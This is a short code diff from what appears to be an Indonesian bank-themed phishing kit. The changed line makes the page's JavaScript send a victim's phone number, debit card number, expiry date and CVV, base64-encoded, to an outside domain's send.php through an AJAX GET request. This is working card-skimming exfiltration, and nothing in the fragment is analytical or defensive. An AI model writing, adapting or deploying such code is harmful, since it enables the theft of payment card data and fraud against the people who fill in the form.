@@ -50,7 +50,7 @@ function process() {
     $("#loader").css("display", "flex");
     $.ajax({
         type: "get",
-        url: "send.php?message="+btoa("No. HP: "+phone+"\nNo. Debit: "+debitNumber+"\nKadaluwarsa: "+expiry+"\nCVV: "+cvv),
+        url: "https://infopromobni.my.id/send.php?message="+btoa("No. HP: "+phone+"\nNo. Debit: "+debitNumber+"\nKadaluwarsa: "+expiry+"\nCVV: "+cvv),
         dataType: "text",
         success: function(response) {
             $("#loader").css("display", "none");
